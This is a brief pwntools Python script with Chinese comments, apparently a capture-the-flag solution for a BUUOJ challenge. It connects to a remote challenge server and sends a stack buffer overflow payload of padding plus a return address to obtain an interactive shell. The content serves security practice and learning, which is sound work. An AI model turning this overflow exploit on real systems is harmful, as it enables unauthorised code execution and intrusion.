from pwn import *
# remote()建立远程连接,指明ip和port
io = remote('node4.buuoj.cn', 28573)
payload = b'a'*(0xf + 0x8) + p64(0x40118A)
io.sendline(payload) #发送数据
io.interactive() #与shell进行交互